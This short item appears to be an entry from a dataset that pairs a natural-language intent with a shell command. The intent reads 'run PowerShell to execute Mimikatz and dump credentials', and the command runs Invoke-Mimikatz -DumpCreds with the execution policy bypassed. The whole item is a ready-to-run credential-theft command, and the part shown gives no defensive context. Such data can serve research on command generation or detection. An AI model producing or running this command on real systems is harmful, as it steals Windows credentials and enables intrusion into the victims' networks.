# Natural language intent:
# Run PowerShell to execute Mimikatz and dump credentials.

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Mimikatz -DumpCreds"
